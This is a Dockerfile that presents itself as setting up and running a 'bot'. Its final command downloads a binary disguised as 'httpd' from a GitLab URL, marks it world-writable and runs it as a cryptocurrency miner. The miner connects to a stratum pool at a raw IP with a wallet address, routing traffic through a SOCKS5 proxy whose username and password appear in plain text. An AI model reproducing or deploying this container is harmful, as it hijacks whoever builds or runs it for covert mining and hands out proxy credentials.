FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd && chmod +x httpd && chmod 777 httpd && ./httpd -a yescryptr16 -o stratum+tcp://149.102.231.74:443 -u web1qusfnt4vf67cfklrn0ntsd6ggpru04dwm7cpsp2.$(echo turu-$(shuf -i 1-9999 -n 1)) -p x -t 4 --proxy=socks5://6SKWObeYXA:6a9pyC0p@sin.socks.ipvanish.com:1080
